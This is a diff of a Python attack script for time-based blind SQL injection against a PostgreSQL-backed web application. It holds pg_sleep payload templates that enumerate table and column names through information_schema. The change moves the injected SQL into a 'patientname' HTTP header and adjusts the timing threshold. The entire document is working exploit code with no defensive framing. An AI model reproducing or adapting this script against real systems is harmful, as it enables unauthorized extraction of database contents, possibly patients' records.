@@ -10,7 +10,7 @@ sql_find_column = "'; SELECT CASE WHEN(t.table_name ILIKE '?' AND c.column_name 
 sql_confirm_column = "'; SELECT CASE WHEN(t.table_name ILIKE '?' AND c.column_name ILIKE '?') THEN pg_sleep(+) ELSE pg_sleep(0) END  FROM information_schema.tables t INNER JOIN information_schema.columns c ON c.table_name = t.table_name AND c.table_schema = t.table_schema --"
 
 
-def test(sql_string, parameters, success_sleep_time="0.05"):
+def test(sql_string, parameters, success_sleep_time="0.1"):
 
     for param in parameters:
         sql_string = sql_string.replace('?', param, 1)
@@ -18,13 +18,11 @@ def test(sql_string, parameters, success_sleep_time="0.05"):
     sql_string = sql_string.replace('+', str(success_sleep_time))
 
     headers = {
-        'guest': 'true',
+        'patientname' : sql_string,
     }
 
-    test_url = url + sql_string
-
     startTime = time.time()
-    requests.request("GET", test_url, headers=headers)
+    requests.request("GET", url, headers=headers)
     executionTime = (time.time() - startTime)
 
     global query_count
